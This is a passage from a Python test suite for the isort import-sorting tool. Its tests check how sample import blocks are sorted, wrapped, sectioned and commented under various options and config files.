    assert SortImports(file_contents=test_input).output == test_input

    # More complicated case
    test_input = (""from a import b  # My Comment1\n""
                  ""from a import c  # My Comment2\n"")
    assert SortImports(file_contents=test_input).output == \
                      (""from a import b  # My Comment1\n""
                       ""from a import c  # My Comment2\n"")

    # Test case where imports comments make imports extend pass the line length
    test_input = (""from a import b # My Comment1\n""
                  ""from a import c # My Comment2\n""
                  ""from a import d\n"")
    assert SortImports(file_contents=test_input, line_length=45).output == \
                      (""from a import b  # My Comment1\n""
                       ""from a import c  # My Comment2\n""
                       ""from a import d\n"")

    # Test case where imports with comments will be beyond line length limit
    test_input = (""from a import b, c  # My Comment1\n""
                  ""from a import c, d # My Comment2 is really really really really long\n"")
    assert SortImports(file_contents=test_input, line_length=45).output == \
                      (""from a import (  # My Comment1; My Comment2 is really really really really long\n""
                       ""    b, c, d)\n"")

    # Test that comments are not stripped from 'import ... as ...' by default
    test_input = (""from a import b as bb  # b comment\n""
                  ""from a import c as cc  # c comment\n"")
    assert SortImports(file_contents=test_input).output == test_input

    # Test that 'import ... as ...' comments are not collected inappropriately
    test_input = (""from a import b as bb  # b comment\n""
                  ""from a import c as cc  # c comment\n""
                  ""from a import d\n"")
    assert SortImports(file_contents=test_input).output == test_input
    assert SortImports(file_contents=test_input, combine_as_imports=True).output == (
        ""from a import b as bb, c as cc, d  # b comment; c comment\n""
    )


def test_multiline_split_on_dot():
    """"""Test to ensure isort correctly handles multiline imports, even when split right after a '.'""""""
    test_input = (""from my_lib.my_package.test.level_1.level_2.level_3.level_4.level_5.\\\n""
                  ""    my_module import my_function"")
    assert SortImports(file_contents=test_input, line_length=70).output == \
            (""from my_lib.my_package.test.level_1.level_2.level_3.level_4.level_5.my_module import \\\n""
             ""    my_function\n"")


def test_import_star():
    """"""Test to ensure isort handles star imports correctly""""""
    test_input = (""from blah import *\n""
                  ""from blah import _potato\n"")
    assert SortImports(file_contents=test_input).output == (""from blah import *\n""
                                                            ""from blah import _potato\n"")
    assert SortImports(file_contents=test_input, combine_star=True).output == (""from blah import *\n"")


def test_include_trailing_comma():
    """"""Test for the include_trailing_comma option""""""
    test_output_grid = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.GRID,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_grid == (
        ""from third_party import (lib1, lib2,\n""
        ""                         lib3, lib4,)\n""
    )

    test_output_vertical = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical == (
        ""from third_party import (lib1,\n""
        ""                         lib2,\n""
        ""                         lib3,\n""
        ""                         lib4,)\n""
    )

    test_output_vertical_indent = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical_indent == (
        ""from third_party import (\n""
        ""    lib1,\n""
        ""    lib2,\n""
        ""    lib3,\n""
        ""    lib4,\n""
        "")\n""
    )

    test_output_vertical_grid = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL_GRID,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical_grid == (
        ""from third_party import (\n""
        ""    lib1, lib2, lib3, lib4,)\n""
    )

    test_output_vertical_grid_grouped = SortImports(
        file_contents=SHORT_IMPORT,
        multi_line_output=WrapModes.VERTICAL_GRID_GROUPED,
        line_length=40,
        include_trailing_comma=True,
    ).output
    assert test_output_vertical_grid_grouped == (
        ""from third_party import (\n""
        ""    lib1, lib2, lib3, lib4,\n""
        "")\n""
    )

    test_output_wrap_single_import_with_use_parentheses = SortImports(
        file_contents=SINGLE_FROM_IMPORT,
        line_length=25,
        include_trailing_comma=True,
        use_parentheses=True
    ).output
    assert test_output_wrap_single_import_with_use_parentheses == (
        ""from third_party import (\n""
        ""    lib1,)\n""
    )

    test_output_wrap_single_import_vertical_indent = SortImports(
        file_contents=SINGLE_FROM_IMPORT,
        line_length=25,
        multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
        include_trailing_comma=True,
        use_parentheses=True
    ).output
    assert test_output_wrap_single_import_vertical_indent == (
        ""from third_party import (\n""
        ""    lib1,\n""
        "")\n""
    )


def test_similar_to_std_library():
    """"""Test to ensure modules that are named similarly to a standard library import don't end up clobbered""""""
    test_input = (""import datetime\n""
                  ""\n""
                  ""import requests\n""
                  ""import times\n"")
    assert SortImports(file_contents=test_input, known_third_party=[""requests"", ""times""]).output == test_input


def test_correctly_placed_imports():
    """"""Test to ensure comments stay on correct placement after being sorted""""""
    test_input = (""from a import b # comment for b\n""
                  ""from a import c # comment for c\n"")
    assert SortImports(file_contents=test_input, force_single_line=True).output == \
                      (""from a import b  # comment for b\n""
                       ""from a import c  # comment for c\n"")
    assert SortImports(file_contents=test_input).output == (""from a import b  # comment for b\n""
                                                            ""from a import c  # comment for c\n"")

    # Full example test from issue #143
    test_input = (""from itertools import chain\n""
                  ""\n""
                  ""from django.test import TestCase\n""
                  ""from model_mommy import mommy\n""
                  ""\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_d""
                  ""efinition\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_d""
                  ""efinition_platform\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_item_product_p""
                  ""latform\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_territory_reta""
                  ""il_model\n""
                  ""from apps.clientman.commands.download_usage_rights import associate_right_for_territory_reta""
                  ""il_model_definition_platform_provider  # noqa\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_defini""
                  ""tion\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_defini""
                  ""tion_platform\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_item_product_platfo""
                  ""rm\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_territory_retail_mo""
                  ""del\n""
                  ""from apps.clientman.commands.download_usage_rights import clear_right_for_territory_retail_mo""
                  ""del_definition_platform_provider  # noqa\n""
                  ""from apps.clientman.commands.download_usage_rights import create_download_usage_right\n""
                  ""from apps.clientman.commands.download_usage_rights import delete_download_usage_right\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_d""
                  ""efinition\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_d""
                  ""efinition_platform\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_item_product_p""
                  ""latform\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_territory_reta""
                  ""il_model\n""
                  ""from apps.clientman.commands.download_usage_rights import disable_download_for_territory_reta""
                  ""il_model_definition_platform_provider  # noqa\n""
                  ""from apps.clientman.commands.download_usage_rights import get_download_rights_for_item\n""
                  ""from apps.clientman.commands.download_usage_rights import get_right\n"")
    assert SortImports(file_contents=test_input, force_single_line=True, line_length=140,
                       known_third_party=[""django"", ""model_mommy""]).output == test_input


def test_auto_detection():
    """"""Initial test to ensure isort auto-detection works correctly - will grow over time as new issues are raised.""""""

    # Issue 157
    test_input = (""import binascii\n""
                  ""import os\n""
                  ""\n""
                  ""import cv2\n""
                  ""import requests\n"")
    assert SortImports(file_contents=test_input, known_third_party=[""cv2"", ""requests""]).output == test_input

    # alternative solution
    assert SortImports(file_contents=test_input, default_section=""THIRDPARTY"").output == test_input


def test_same_line_statements():
    """"""Ensure isort correctly handles the case where a single line contains multiple statements including an import""""""
    test_input = (""import pdb; import nose\n"")
    assert SortImports(file_contents=test_input).output == (""import pdb\n""
                                                            ""\n""
                                                            ""import nose\n"")

    test_input = (""import pdb; pdb.set_trace()\n""
                  ""import nose; nose.run()\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_long_line_comments():
    """"""Ensure isort correctly handles comments at the end of extremely long lines""""""
    test_input = (""from foo.utils.fabric_stuff.live import check_clean_live, deploy_live, sync_live_envdir, ""
                  ""update_live_app, update_live_cron  # noqa\n""
                  ""from foo.utils.fabric_stuff.stage import check_clean_stage, deploy_stage, sync_stage_envdir, ""
                  ""update_stage_app, update_stage_cron  # noqa\n"")
    assert SortImports(file_contents=test_input).output == \
                (""from foo.utils.fabric_stuff.live import (check_clean_live, deploy_live,  # noqa\n""
                 ""                                         sync_live_envdir, update_live_app, update_live_cron)\n""
                 ""from foo.utils.fabric_stuff.stage import (check_clean_stage, deploy_stage,  # noqa\n""
                 ""                                          sync_stage_envdir, update_stage_app, update_stage_cron)\n"")


def test_tab_character_in_import():
    """"""Ensure isort correctly handles import statements that contain a tab character""""""
    test_input = (""from __future__ import print_function\n""
                  ""from __future__ import\tprint_function\n"")
    assert SortImports(file_contents=test_input).output == ""from __future__ import print_function\n""


def test_split_position():
    """"""Ensure isort splits on import instead of . when possible""""""
    test_input = (""from p24.shared.exceptions.master.host_state_flag_unchanged import HostStateUnchangedException\n"")
    assert SortImports(file_contents=test_input, line_length=80).output == \
                                            (""from p24.shared.exceptions.master.host_state_flag_unchanged import \\\n""
                                             ""    HostStateUnchangedException\n"")


def test_place_comments():
    """"""Ensure manually placing imports works as expected""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.test\n""
                  ""import django.settings\n""
                  ""\n""
                  ""# isort:imports-thirdparty\n""
                  ""# isort:imports-firstparty\n""
                  ""print('code')\n""
                  ""\n""
                  ""# isort:imports-stdlib\n"")
    expected_output = (""\n# isort:imports-thirdparty\n""
                       ""import django.settings\n""
                       ""\n""
                       ""# isort:imports-firstparty\n""
                       ""import myproject.test\n""
                       ""\n""
                       ""print('code')\n""
                       ""\n""
                       ""# isort:imports-stdlib\n""
                       ""import os\n""
                       ""import sys\n"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django']).output
    assert test_output == expected_output
    test_output = SortImports(file_contents=test_output, known_third_party=['django']).output
    assert test_output == expected_output


def test_placement_control():
    """"""Ensure that most specific placement control match wins""""""
    test_input = (""import os\n""
                  ""import sys\n""
                  ""from bottle import Bottle, redirect, response, run\n""
                  ""import p24.imports._argparse as argparse\n""
                  ""import p24.imports._subprocess as subprocess\n""
                  ""import p24.imports._VERSION as VERSION\n""
                  ""import p24.shared.media_wiki_syntax as syntax\n"")
    test_output = SortImports(file_contents=test_input,
                known_first_party=['p24', 'p24.imports._VERSION'],
                known_standard_library=['p24.imports'],
                known_third_party=['bottle'],
                default_section=""THIRDPARTY"").output

    assert test_output == (""import os\n""
                           ""import p24.imports._argparse as argparse\n""
                           ""import p24.imports._subprocess as subprocess\n""
                           ""import sys\n""
                           ""\n""
                           ""from bottle import Bottle, redirect, response, run\n""
                           ""\n""
                           ""import p24.imports._VERSION as VERSION\n""
                           ""import p24.shared.media_wiki_syntax as syntax\n"")


def test_custom_sections():
    """"""Ensure that most specific placement control match wins""""""
    test_input = (""import os\n""
                  ""import sys\n""
                  ""from django.conf import settings\n""
                  ""from bottle import Bottle, redirect, response, run\n""
                  ""import p24.imports._argparse as argparse\n""
                  ""from django.db import models\n""
                  ""import p24.imports._subprocess as subprocess\n""
                  ""import pandas as pd\n""
                  ""import p24.imports._VERSION as VERSION\n""
                  ""import numpy as np\n""
                  ""import p24.shared.media_wiki_syntax as syntax\n"")
    test_output = SortImports(file_contents=test_input,
                known_first_party=['p24', 'p24.imports._VERSION'],
                import_heading_stdlib='Standard Library',
                import_heading_thirdparty='Third Party',
                import_heading_firstparty='First Party',
                import_heading_django='Django',
                import_heading_pandas='Pandas',
                known_standard_library=['p24.imports'],
                known_third_party=['bottle'],
                known_django=['django'],
                known_pandas=['pandas', 'numpy'],
                default_section=""THIRDPARTY"",
                sections=[""FUTURE"", ""STDLIB"", ""DJANGO"", ""THIRDPARTY"", ""PANDAS"", ""FIRSTPARTY"", ""LOCALFOLDER""]).output
    assert test_output == (""# Standard Library\n""
                           ""import os\n""
                           ""import p24.imports._argparse as argparse\n""
                           ""import p24.imports._subprocess as subprocess\n""
                           ""import sys\n""
                           ""\n""
                           ""# Django\n""
                           ""from django.conf import settings\n""
                           ""from django.db import models\n""
                           ""\n""
                           ""# Third Party\n""
                           ""from bottle import Bottle, redirect, response, run\n""
                           ""\n""
                           ""# Pandas\n""
                           ""import numpy as np\n""
                           ""import pandas as pd\n""
                           ""\n""
                           ""# First Party\n""
                           ""import p24.imports._VERSION as VERSION\n""
                           ""import p24.shared.media_wiki_syntax as syntax\n"")


def test_glob_known():
    """"""Ensure that most specific placement control match wins""""""
    test_input = (""import os\n""
                  ""from django_whatever import whatever\n""
                  ""import sys\n""
                  ""from django.conf import settings\n""
                  ""from . import another\n"")
    test_output = SortImports(file_contents=test_input,
                import_heading_stdlib='Standard Library',
                import_heading_thirdparty='Third Party',
                import_heading_firstparty='First Party',
                import_heading_django='Django',
                import_heading_djangoplugins='Django Plugins',
                import_heading_localfolder='Local',
                known_django=['django'],
                known_djangoplugins=['django_*'],
                default_section=""THIRDPARTY"",
                sections=[""FUTURE"", ""STDLIB"", ""DJANGO"", ""DJANGOPLUGINS"", ""THIRDPARTY"", ""FIRSTPARTY"", ""LOCALFOLDER""]).output
    assert test_output == (""# Standard Library\n""
                           ""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""# Django\n""
                           ""from django.conf import settings\n""
                           ""\n""
                           ""# Django Plugins\n""
                           ""from django_whatever import whatever\n""
                           ""\n""
                           ""# Local\n""
                           ""from . import another\n"")


def test_sticky_comments():
    """"""Test to ensure it is possible to make comments 'stick' above imports""""""
    test_input = (""import os\n""
                  ""\n""
                  ""# Used for type-hinting (ref: https://github.com/davidhalter/jedi/issues/414).\n""
                  ""from selenium.webdriver.remote.webdriver import WebDriver  # noqa\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""from django import forms\n""
                  ""# While this couples the geographic forms to the GEOS library,\n""
                  ""# it decouples from database (by not importing SpatialBackend).\n""
                  ""from django.contrib.gis.geos import GEOSException, GEOSGeometry\n""
                  ""from django.utils.translation import ugettext_lazy as _\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_zipimport():
    """"""Imports ending in ""import"" shouldn't be clobbered""""""
    test_input = ""from zipimport import zipimport\n""
    assert SortImports(file_contents=test_input).output == test_input


def test_from_ending():
    """"""Imports ending in ""from"" shouldn't be clobbered.""""""
    test_input = ""from foo import get_foo_from, get_foo\n""
    expected_output = ""from foo import get_foo, get_foo_from\n""
    assert SortImports(file_contents=test_input).output == expected_output


def test_from_first():
    """"""Tests the setting from_first works correctly""""""
    test_input = ""from os import path\nimport os\n""
    assert SortImports(file_contents=test_input, from_first=True).output == test_input


def test_top_comments():
    """"""Ensure correct behavior with top comments""""""
    test_input = (""# -*- encoding: utf-8 -*-\n""
                  ""# Test comment\n""
                  ""#\n""
                  ""from __future__ import unicode_literals\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# -*- coding: utf-8 -*-\n""
                  ""from django.db import models\n""
                  ""from django.utils.encoding import python_2_unicode_compatible\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# Comment\n""
                  ""import sys\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# -*- coding\n""
                  ""import sys\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_consistency():
    """"""Ensures consistency of handling even when dealing with non ordered-by-type imports""""""
    test_input = ""from sqlalchemy.dialects.postgresql import ARRAY, array\n""
    assert SortImports(file_contents=test_input, order_by_type=True).output == test_input


def test_force_grid_wrap():
    """"""Ensures removing imports works as expected.""""""
    test_input = (
      ""from bar import lib2\n""
      ""from foo import lib6, lib7\n""
    )
    test_output = SortImports(
      file_contents=test_input,
      force_grid_wrap=2,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT
      ).output
    assert test_output == """"""from bar import lib2
from foo import (
    lib6,
    lib7
)
""""""
    test_output = SortImports(
      file_contents=test_input,
      force_grid_wrap=3,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT
      ).output
    assert test_output == test_input


def test_force_grid_wrap_long():
    """"""Ensure that force grid wrap still happens with long line length""""""
    test_input = (
      ""from foo import lib6, lib7\n""
      ""from bar import lib2\n""
      ""from babar import something_that_is_kind_of_long""
    )
    test_output = SortImports(
      file_contents=test_input,
      force_grid_wrap=2,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
      line_length=9999,
      ).output
    assert test_output == """"""from babar import something_that_is_kind_of_long
from bar import lib2
from foo import (
    lib6,
    lib7
)
""""""


def test_uses_jinja_variables():
    """"""Test a basic set of imports that use jinja variables""""""
    test_input = (""import sys\n""
                  ""import os\n""
                  ""import myproject.{ test }\n""
                  ""import django.{ settings }"")
    test_output = SortImports(file_contents=test_input, known_third_party=['django'],
                              known_first_party=['myproject']).output
    assert test_output == (""import os\n""
                           ""import sys\n""
                           ""\n""
                           ""import django.{ settings }\n""
                           ""\n""
                           ""import myproject.{ test }\n"")

    test_input = (""import {{ cookiecutter.repo_name }}\n""
                  ""from foo import {{ cookiecutter.bar }}\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_fcntl():
    """"""Test to ensure fcntl gets correctly recognized as stdlib import""""""
    test_input = (""import fcntl\n""
                  ""import os\n""
                  ""import sys\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_import_split_is_word_boundary_aware():
    """"""Test to ensure that isort splits words in a boundary aware manner""""""
    test_input = (""from mycompany.model.size_value_array_import_func import \\\n""
                ""    get_size_value_array_import_func_jobs"")
    test_output = SortImports(file_contents=test_input,
      multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
      line_length=79).output
    assert test_output == (""from mycompany.model.size_value_array_import_func import (\n""
                           ""    get_size_value_array_import_func_jobs\n""
                           "")\n"")


def test_other_file_encodings(tmpdir):
    """"""Test to ensure file encoding is respected""""""
    for encoding in ('latin1', 'utf8'):
        tmp_fname = tmpdir.join('test_{0}.py'.format(encoding))
        file_contents = ""# coding: {0}\n\ns = u'ã'\n"".format(encoding)
        tmp_fname.write_binary(file_contents.encode(encoding))
        assert SortImports(file_path=str(tmp_fname), settings_path=os.getcwd()).output == file_contents


def test_comment_at_top_of_file():
    """"""Test to ensure isort correctly handles top of file comments""""""
    test_input = (""# Comment one\n""
                  ""from django import forms\n""
                  ""# Comment two\n""
                  ""from django.contrib.gis.geos import GEOSException\n"")
    assert SortImports(file_contents=test_input).output == test_input

    test_input = (""# -*- coding: utf-8 -*-\n""
                  ""from django.db import models\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_alphabetic_sorting():
    """"""Test to ensure isort correctly handles single line imports""""""
    test_input = (""import unittest\n""
                  ""\n""
                  ""import ABC\n""
                  ""import Zope\n""
                  ""from django.contrib.gis.geos import GEOSException\n""
                  ""from plone.app.testing import getRoles\n""
                  ""from plone.app.testing import ManageRoles\n""
                  ""from plone.app.testing import setRoles\n""
                  ""from Products.CMFPlone import utils\n""
                  )
    options = {'force_single_line': True,
               'force_alphabetical_sort_within_sections': True}  # type: Dict[str, Any]

    output = SortImports(file_contents=test_input, known_first_party=['django'], **options).output
    assert output == test_input

    test_input = (""# -*- coding: utf-8 -*-\n""
                  ""from django.db import models\n"")
    assert SortImports(file_contents=test_input).output == test_input


def test_alphabetic_sorting_multi_line():
    """"""Test to ensure isort correctly handles multiline import see: issue 364""""""
    test_input = (""from a import (CONSTANT_A, cONSTANT_B, CONSTANT_C, CONSTANT_D, CONSTANT_E,\n""
                  ""               CONSTANT_F, CONSTANT_G, CONSTANT_H, CONSTANT_I, CONSTANT_J)\n"")
    options = {'force_alphabetical_sort_within_sections': True}  # type: Dict[str, Any]
    assert SortImports(file_contents=test_input, **options).output == test_input


def test_comments_not_duplicated():
    """"""Test to ensure comments aren't duplicated: issue 303""""""
    test_input = ('from flask import url_for\n'
                  ""# Whole line comment\n""
                  'from service import demo  # inline comment\n'
                  'from service import settings\n')
    output = SortImports(file_contents=test_input).output
    assert output.count(""# Whole line comment\n"") == 1
    assert output.count(""# inline comment\n"") == 1


def test_top_of_line_comments():
    """"""Test to ensure top of line comments stay where they should: issue 260""""""
    test_input = ('# -*- coding: utf-8 -*-\n'
                  'from django.db import models\n'
                  '#import json as simplejson\n'
                  'from myproject.models import Servidor\n'
                  '\n'
                  'import reversion\n'
                   '\n'
                   'import logging\n')
    output = SortImports(file_contents=test_input).output
    print(output)
    assert output.startswith('# -*- coding: utf-8 -*-\n')


def test_basic_comment():
    """"""Test to ensure a basic comment wont crash isort""""""
    test_input = ('import logging\n'
                  '# Foo\n'
                  'import os\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_shouldnt_add_lines():
    """"""Ensure that isort doesn't add a blank line when a top of import comment is present, issue #316""""""
    test_input = ('""""""Text""""""\n'
                  '# This is a comment\n'
                 'import pkg_resources\n')
    assert SortImports(file_contents=test_input).output == test_input


def test_sections_parsed_correct(tmpdir):
    """"""Ensure that modules for custom sections parsed as list from config file and isort result is correct""""""
    conf_file_data = (
        '[settings]\n'
        'sections=FUTURE,STDLIB,THIRDPARTY,FIRSTPARTY,LOCALFOLDER,COMMON\n'
        'known_common=nose\n'
        'import_heading_common=Common Library\n'
        'import_heading_stdlib=Standard Library\n'
    )
    test_input = (
        'import os\n'
        'from nose import *\n'
        'import nose\n'
        'from os import path'
    )
    correct_output = (
        '# Standard Library\n'
        'import os\n'
        'from os import path\n'
        '\n'
        '# Common Library\n'
        'import nose\n'
        'from nose import *\n'
    )
    tmpdir.join('.isort.cfg').write(conf_file_data)
    assert SortImports(file_contents=test_input, settings_path=str(tmpdir)).output == correct_output


@pytest.mark.skipif(toml is None, reason=""Requires toml package to be installed."")
def test_pyproject_conf_file(tmpdir):
    """"""Ensure that modules for custom sections parsed as list from config file and isort result is correct""""""
    conf_file_data = (
        '[build-system]\n'
        'requires = [""setuptools"", ""wheel""]\n'
        '[tool.poetry]\n'
        'name = ""isort""\n'
        'version = ""0.1.0""\n'
        'license = ""MIT""\n'
        '[tool.isort]\n'
        'lines_between_types=1\n'
        'known_common=""nose""\n'
        'import_heading_common=""Common Library""\n'
        'import_heading_stdlib=""Standard Library""\n'
        'sections=""FUTURE,STDLIB,THIRDPARTY,FIRSTPARTY,LOCALFOLDER,COMMON""\n'
        'include_trailing_comma = true\n'
    )
    test_input = (
        'import os\n'
        'from nose import *\n'
        'import nose\n'
        'from os import path'
    )
    correct_output = (
        '# Standard Library\n'
        'import os\n'
        '\n'
        'from os import path\n'
        '\n'
        '# Common Library\n'
        'import nose\n'
        '\n'
        'from nose import *\n'
    )
    tmpdir.join('pyproject.toml').write(conf_file_data)
    assert SortImports(file_contents=test_input, settings_path=str(tmpdir)).output == correct_output


def test_alphabetic_sorting_no_newlines():
    '''Test to ensure that alphabetical sort does not erroneously introduce new lines (issue #328)'''
    test_input = ""import os\n""
    test_output = SortImports(file_contents=test_input, force_alphabetical_sort_within_sections=True).output
    assert test_input == test_output

    test_input = ('import os\n'
                  'import unittest\n'
                  '\n'
                  'from a import b\n'
                  '\n'
                  '\n'
                  'print(1)\n')
    test_output = SortImports(file_contents=test_input, force_alphabetical_sort_within_sections=True, lines_after_imports=2).output
    assert test_input == test_output


def test_sort_within_section():
    '''Test to ensure its possible to force isort to sort within sections'''
    test_input = ('from Foob import ar\n'
                  'import foo\n'
                  'from foo import bar\n'
                  'from foo.bar import Quux, baz\n')
    test_output = SortImports(file_contents=test_input, force_sort_within_sections=True).output
    assert test_output == test_input

    test_input = ('import foo\n'
                  'from foo import bar\n'
                  'from foo.bar import baz\n'
                  'from foo.bar import Quux\n'
                  'from Foob import ar\n')
    test_output = SortImports(file_contents=test_input, force_sort_within_sections=True, order_by_type=False,
                              force_single_line=True).output
    assert test_output == test_input


def test_sorting_with_two_top_comments():
    '''Test to ensure isort will sort files that contain 2 top comments'''
    test_input = ('#! comment1\n'
                  ""''' comment2\n""
                  ""'''\n""
                  'import b\n'
                  'import a\n')
    assert SortImports(file_contents=test_input).output == ('#! comment1\n'
                                                            ""''' comment2\n""
                                                            ""'''\n""
                                                            'import a\n'
                                                            'import b\n')


def test_lines_between_sections():
    """"""Test to ensure lines_between_sections works""""""
    test_input = ('from bar import baz\n'
                  'import os\n')
    assert SortImports(file_contents=test_input, lines_between_sections=0).output == ('import os\n'
                                                                                      'from bar import baz\n')
    assert SortImports(file_contents=test_input, lines_between_sections=2).output == ('import os\n\n\n'
                                                                                      'from bar import baz\n')


def test_forced_sepatate_globs():
    """"""Test to ensure that forced_separate glob matches lines""""""
    test_input = ('import os\n'
                  '\n'
                  'from myproject.foo.models import Foo\n'
                  '\n'
                  'from myproject.utils import util_method\n'
                  '\n'
                  'from myproject.bar.models import Bar\n'
                  '\n'
                  'import sys\n')
    test_output = SortImports(file_contents=test_input, forced_separate=['*.models'],
                              line_length=120).output

    assert test_output == ('import os\n'
                          'import sys\n'
                          '\n'
                          'from myproject.utils import util_method\n'
                          '\n'
                          'from myproject.bar.models import Bar\n'
                          'from myproject.foo.models import Foo\n')


def test_no_additional_lines_issue_358():
    """"""Test to ensure issue 358 is resolved and running isort multiple times does not add extra newlines""""""
    test_input = ('""""""This is a docstring""""""\n'
                  '# This is a comment\n'
                  'from __future__ import (\n'
                  '    absolute_import,\n'
                  '    division,\n'
                  '    print_function,\n'
                  '    unicode_literals\n'
                  ')\n')
    expected_output = ('""""""This is a docstring""""""\n'
                       '# This is a comment\n'
                       'from __future__ import (\n'
                       '    absolute_import,\n'
                       '    division,\n'
                       '    print_function,\n'
                       '    unicode_literals\n'
                       ')\n')
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    for attempt in range(5):
        test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                  line_length=20).output
        assert test_output == expected_output

    test_input = ('""""""This is a docstring""""""\n'
                  '\n'
                  '# This is a comment\n'
                  'from __future__ import (\n'
                  '    absolute_import,\n'
                  '    division,\n'
                  '    print_function,\n'
                  '    unicode_literals\n'
                  ')\n')
    expected_output = ('""""""This is a docstring""""""\n'
                       '\n'
                       '# This is a comment\n'
                       'from __future__ import (\n'
                       '    absolute_import,\n'
                       '    division,\n'
                       '    print_function,\n'
                       '    unicode_literals\n'
                       ')\n')
    test_output = SortImports(file_contents=test_input, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                              line_length=20).output
    assert test_output == expected_output

    for attempt in range(5):
        test_output = SortImports(file_contents=test_output, multi_line_output=WrapModes.VERTICAL_HANGING_INDENT,
                                  line_length=20).output
        assert test_output == expected_output


def test_import_by_paren_issue_375():
    """"""Test to ensure isort can correctly handle sorting imports where the paren is directly by the import body""""""
    test_input = ('from .models import(\n'
                  '   Foo,\n'
                  '   Bar,\n'
                  ')\n')
    assert SortImports(file_contents=test_input).output == 'from .models import Bar, Foo\n'


def test_import_by_paren_issue_460():
    """"""Test to ensure isort can doesnt move comments around """"""
    test_input = """"""
# First comment
# Second comment
# third comment
import io
import os
""""""
    assert SortImports(file_contents=(test_input)).output == test_input


def test_function_with_docstring():
    """"""Test to ensure isort can correctly sort imports when the first found content is a function with a docstring""""""
    add_imports = ['from __future__ import unicode_literals']
    test_input = ('def foo():\n'
                  '    """""" Single line triple quoted doctring """"""\n'
                  '    pass\n')
    expected_output = ('from __future__ import unicode_literals\n'
                       '\n'
                       '\n'
                       'def foo():\n'
                       '    """""" Single line triple quoted doctring """"""\n'
                       '    pass\n')
    assert SortImports(file_contents=test_input, add_imports=add_imports).output == expected_output


def test_plone_style():
    """"""Test to ensure isort correctly plone style imports""""""
    test_input = (""from django.contrib.gis.geos import GEOSException\n""
                  ""from plone.app.testing import getRoles\n""
                  ""from plone.app.testing import ManageRoles\n""
                  ""from plone.app.testing import setRoles\n""
                  ""from Products.CMFPlone import utils\n""
                  ""\n""
                  ""import ABC\n""
                  ""import unittest\n""
                  ""import Zope\n"")
    options = {'force_single_line': True,
               'force_alphabetical_sort': True}  # type: Dict[str, Any]
    assert SortImports(file_contents=test_input, **options).output == test_input


def test_third_party_case_sensitive():
    """"""Modules which match builtins by name but not on case should not be picked up on Windows.""""""
    test_input = (""import thirdparty\n""
                  ""import os\n""
                  ""import ABC\n"")

    expected_output = ('import os\n'
                       '\n'
                       'import ABC\n'
                       'import thirdparty\n')
    assert SortImports(file_contents=test_input).output == expected_output


def test_exists_case_sensitive_file(tmpdir):
    """"""Test exists_case_sensitive function for a file.""""""
    tmpdir.join('module.py').ensure(file=1)
    assert exists_case_sensitive(str(tmpdir.join('module.py')))
    assert not exists_case_sensitive(str(tmpdir.join('MODULE.py')))


def test_exists_case_sensitive_directory(tmpdir):
    """"""Test exists_case_sensitive function for a directory.""""""
    tmpdir.join('pkg').ensure(dir=1)
    assert exists_case_sensitive(str(tmpdir.join('pkg')))
    assert not exists_case_sensitive(str(tmpdir.join('PKG')))


def test_sys_path_mutation(tmpdir):
    """"""Test to ensure sys.path is not modified""""""
    tmpdir.mkdir('src').mkdir('a')
    test_input = ""from myproject import test""
    options = {'virtual_env': str(tmpdir)}  # type: Dict[str, Any]
    expected_length = len(sys.path)
    SortImports(file_contents=test_input, **options).output
    assert len(sys.path) == expected_length


def test_long_single_line():
